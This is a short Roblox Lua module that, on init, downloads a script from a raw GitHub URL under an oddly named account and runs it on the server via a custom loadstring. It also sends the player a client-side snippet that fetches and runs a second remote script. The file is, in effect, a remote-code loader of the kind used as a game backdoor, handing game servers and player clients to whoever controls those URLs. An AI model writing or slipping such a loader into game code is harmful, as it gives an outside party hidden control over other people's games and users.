local loadstring = require(game:GetService("ReplicatedStorage"):FindFirstChild("loadstring"))

local module = {}

function module.init(playere)
    local Player = playere
	local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/s.lua", true))()

	local thecode = [[
		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
		local loadstrng = game:GetService("ReplicatedStorage"):WaitForChild("gethttp", 99999):InvokeServer("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/l.lua")

		local localscripts = loadstring(loadstrng)(...)

		localscripts.init(...)
	]]

    serverscripts.init(playere)
	game:GetService("ReplicatedStorage"):FindFirstChild("runclient"):FireClient(playere, thecode, Player)
end

return module